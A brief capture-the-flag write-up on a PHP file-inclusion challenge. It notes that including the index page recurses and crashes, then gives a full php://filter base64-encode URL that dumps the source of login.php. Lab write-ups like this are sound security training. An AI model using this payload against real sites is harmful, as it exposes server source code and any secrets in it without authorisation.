php filters !!
_http://challs2.hackademint.org:13402_?page=index
=> crash because infinite recursion

Instead, we can b64 encore the page (wrappers/filters are allowed) and avoid the loop
_http://challs2.hackademint.org:13402_?page=php://filter/read=convert.base64-encode/resource=login.php
